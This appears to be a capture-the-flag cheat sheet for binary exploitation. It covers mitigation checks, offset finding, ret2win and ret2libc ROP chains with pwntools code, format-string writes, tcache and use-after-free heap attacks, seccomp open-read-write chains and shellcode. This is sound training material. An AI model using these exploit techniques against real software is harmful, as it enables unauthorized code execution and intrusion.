# pwn

Read the mitigations before writing a byte.

```bash
checksec --file=./chal
file ./chal
```

| Mitigation | Consequence |
| --- | --- |
| No PIE | fixed addresses, classic ret2win/ROP |
| PIE | need a leak before any absolute address |
| Canary | leak it (format string, `%s` over-read) or avoid the return path |
| NX off | shellcode on stack/heap |
| Full RELRO | GOT is read-only, aim at libc/stack |
| seccomp | ORW chain or a syscall allowed by the filter |

## Offset

```bash
pwn cyclic 200 | ./chal          # crash value
pwn cyclic -l 0x6161616b         # offset
```

Or `gdb -q ./chal -ex 'run < <(cyclic 200)' -ex 'info registers rip'`. Verify the offset with a
`ret2win` before building the real chain.

## ret2win

`payload = b"A"*offset + p64(win)`. If it crashes inside `win` on `movaps`, insert one `ret` for
16-byte stack alignment.

## ret2libc

Leak a resolved GOT entry through `puts`/`write`, return to `main`, compute the base, second
stage `system("/bin/sh")`.

```python
rop = ROP(elf)
rop.call(elf.plt["puts"], [elf.got["puts"]])
rop.call(elf.symbols["main"])
io.sendline(flat({offset: rop.chain()}))
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]
```

`libc-database` or `one_gadget ./libc.so.6` for the provided libc. Never assume the host's.

## Format string

Find the argument index: `%p` walks the stack.

```python
for i in range(1, 40):
    io.sendline(f"%{i}$p".encode())
```

Arbitrary write with `%n` at a chosen index, `pwntools fmtstr_payload(offset, {target: value})`.
Target the GOT of a function called after the read, or a return address on the stack.

## Heap

- tcache poisoning: overwrite `fd` of a freed chunk, `malloc` twice, second returns the target.
  Modern glibc checks `safe-linking`: `fd = target ^ (chunk_addr >> 12)`.
- UAF with a vtable/function pointer → point at `system` or a one-gadget.
- House of Force / unsorted bin leaks when the primitive is weaker.

## seccomp

Dump the filter: `seccomp-tools dump ./chal`. If `open/read/write` survive, build an ORW ROP with
`openat`, `read`, `write` on a known path; if only `openat` is blocked, try `open`.

## Shellcode

`shellcraft.amd64.linux.sh()`, or ORW:

```python
sc = shellcraft.open("./flag")
sc += shellcraft.read("rax", "rsp", 0x100)
sc += shellcraft.write(1, "rsp", 0x100)
```

## Kernel / misc

`/proc/self/maps` and `vmmap` for ASLR state. For a kernel challenge, note the distro and version,
and whether KASLR/SMEP/SMAP are on before choosing a technique.
